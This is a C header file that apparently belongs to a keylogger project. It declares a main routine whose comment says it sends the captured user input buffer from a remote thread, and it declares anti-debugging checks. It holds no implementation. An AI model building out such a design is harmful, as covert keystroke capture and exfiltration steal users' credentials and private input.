#ifndef MAIN_H
#define MAIN_H

extern BYTE _checkDebugger(void);

char* userId;
char* result;

/**
 * @brief Main function invoking preparation routines, starts remote thread to send user input buffer,
 *        and launches the keylogger core functionality.
 *
 * @return int Exit code of the program.
 */
int main();

/**
 * @brief Verifies if the program is running in debug mode.
 *
 */
void isDebuggerModeOn();

#endif
